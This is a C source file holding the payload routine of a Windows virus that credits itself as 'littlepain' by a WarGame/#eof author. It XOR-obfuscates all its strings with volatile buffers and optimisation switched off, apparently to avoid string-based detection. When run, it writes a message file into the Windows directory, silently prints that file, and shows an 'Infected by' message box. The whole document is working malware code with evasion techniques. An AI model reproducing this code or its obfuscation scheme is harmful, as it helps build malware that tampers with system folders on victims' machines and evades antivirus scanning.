#include "data_globals.h"
#include <windows.h>
#include <shellapi.h>   // added for ShellExecuteA
#include <string.h>
#include <stddef.h>    // for size_t

#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

void _Payload(void)
{
    CHAR flag_path[MAX_PATH];
    HANDLE flag_fd;
    DWORD written;

    // "\\MSG_FOR_YOU.txt" XOR'd with key 0x3E
    volatile char sz_filename[] = {
        '\\'^0x3E, 'M'^0x3E, 'S'^0x3E, 'G'^0x3E, '_'^0x3E, 'F'^0x3E, 'O'^0x3E, 'R'^0x3E,
        '_'^0x3E, 'Y'^0x3E, 'O'^0x3E, 'U'^0x3E, '.'^0x3E, 't'^0x3E, 'x'^0x3E, 't'^0x3E,
        0x00^0x3E
    };
    xor_decrypt(sz_filename, sizeof(sz_filename), 0x3E);

    // "Dear user, your system needs some security improvements!" XOR'd with key 0x7A
    volatile char sz_message[] = {
        'D'^0x7A, 'e'^0x7A, 'a'^0x7A, 'r'^0x7A, ' '^0x7A, 'u'^0x7A, 's'^0x7A, 'e'^0x7A,
        'r'^0x7A, ','^0x7A, ' '^0x7A, 'y'^0x7A, 'o'^0x7A, 'u'^0x7A, 'r'^0x7A, ' '^0x7A,
        's'^0x7A, 'y'^0x7A, 's'^0x7A, 't'^0x7A, 'e'^0x7A, 'm'^0x7A, ' '^0x7A, 'n'^0x7A,
        'e'^0x7A, 'e'^0x7A, 'd'^0x7A, 's'^0x7A, ' '^0x7A, 's'^0x7A, 'o'^0x7A, 'm'^0x7A,
        'e'^0x7A, ' '^0x7A, 's'^0x7A, 'e'^0x7A, 'c'^0x7A, 'u'^0x7A, 'r'^0x7A, 'i'^0x7A,
        't'^0x7A, 'y'^0x7A, ' '^0x7A, 'i'^0x7A, 'm'^0x7A, 'p'^0x7A, 'r'^0x7A, 'o'^0x7A,
        'v'^0x7A, 'e'^0x7A, 'm'^0x7A, 'e'^0x7A, 'n'^0x7A, 't'^0x7A, 's'^0x7A, '!'^0x7A,
        0x00^0x7A
    };
    xor_decrypt(sz_message, sizeof(sz_message), 0x7A);

    // "print" XOR'd with key 0x1F
    volatile char sz_action[] = {
        'p'^0x1F, 'r'^0x1F, 'i'^0x1F, 'n'^0x1F, 't'^0x1F, 0x00^0x1F
    };
    xor_decrypt(sz_action, sizeof(sz_action), 0x1F);

    // "Infected by littlepain by [WarGame,#eof] ( italian guy )" XOR'd with key 0x2C
    volatile char sz_title[] = {
        'I'^0x2C, 'n'^0x2C, 'f'^0x2C, 'e'^0x2C, 'c'^0x2C, 't'^0x2C, 'e'^0x2C, 'd'^0x2C,
        ' '^0x2C, 'b'^0x2C, 'y'^0x2C, ' '^0x2C, 'l'^0x2C, 'i'^0x2C, 't'^0x2C, 't'^0x2C,
        'l'^0x2C, 'e'^0x2C, 'p'^0x2C, 'a'^0x2C, 'i'^0x2C, 'n'^0x2C, ' '^0x2C, 'b'^0x2C,
        'y'^0x2C, ' '^0x2C, '['^0x2C, 'W'^0x2C, 'a'^0x2C, 'r'^0x2C, 'G'^0x2C, 'a'^0x2C,
        'm'^0x2C, 'e'^0x2C, ','^0x2C, '#'^0x2C, 'e'^0x2C, 'o'^0x2C, 'f'^0x2C, ']'^0x2C,
        ' '^0x2C, '('^0x2C, ' '^0x2C, 'i'^0x2C, 't'^0x2C, 'a'^0x2C, 'l'^0x2C, 'i'^0x2C,
        'a'^0x2C, 'n'^0x2C, ' '^0x2C, 'g'^0x2C, 'u'^0x2C, 'y'^0x2C, ' '^0x2C, ')'^0x2C,
        0x00^0x2C
    };
    xor_decrypt(sz_title, sizeof(sz_title), 0x2C);

    // "Credits" XOR'd with key 0x5A
    volatile char sz_caption[] = {
        'C'^0x5A, 'r'^0x5A, 'e'^0x5A, 'd'^0x5A, 'i'^0x5A, 't'^0x5A, 's'^0x5A, 0x00^0x5A
    };
    xor_decrypt(sz_caption, sizeof(sz_caption), 0x5A);

    GetWindowsDirectoryA(flag_path, MAX_PATH);
    strcat(flag_path, (char*)sz_filename);

    flag_fd = CreateFileA(flag_path, GENERIC_WRITE, FILE_SHARE_WRITE,
                          NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (flag_fd != INVALID_HANDLE_VALUE)
    {
        WriteFile(flag_fd, (char*)sz_message, 56, &written, NULL);
        CloseHandle(flag_fd);
        ShellExecuteA(NULL, (char*)sz_action, flag_path, NULL, NULL, SW_HIDE);
        MessageBoxA(NULL, (char*)sz_title, (char*)sz_caption,
                    MB_OK | MB_ICONINFORMATION);
    }
}
#pragma optimize("", on)
